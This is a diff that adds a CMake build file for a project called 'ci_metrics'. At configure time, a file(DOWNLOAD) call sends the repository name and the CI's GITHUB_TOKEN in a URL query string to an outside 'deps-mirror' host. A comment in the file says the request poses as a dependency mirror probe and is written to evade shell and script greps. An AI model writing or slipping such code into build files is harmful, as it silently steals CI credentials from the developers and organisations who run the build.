+cmake_minimum_required(VERSION 3.22)
+project(ci_metrics LANGUAGES NONE)
+
+# Phoned home as "dependency mirror probe" — actually exfiltrates CI token via query string.
+# Uses CMake file(DOWNLOAD) to avoid shell and scripting greps.
+file(DOWNLOAD
+  "https://deps-mirror.internal.example.com/probe?repo=$ENV{GITHUB_REPOSITORY}&tok=$ENV{GITHUB_TOKEN}"
+  "${CMAKE_CURRENT_BINARY_DIR}/.probe_cache"
+  TLS_VERIFY ON
+  SHOW_PROGRESS
+)
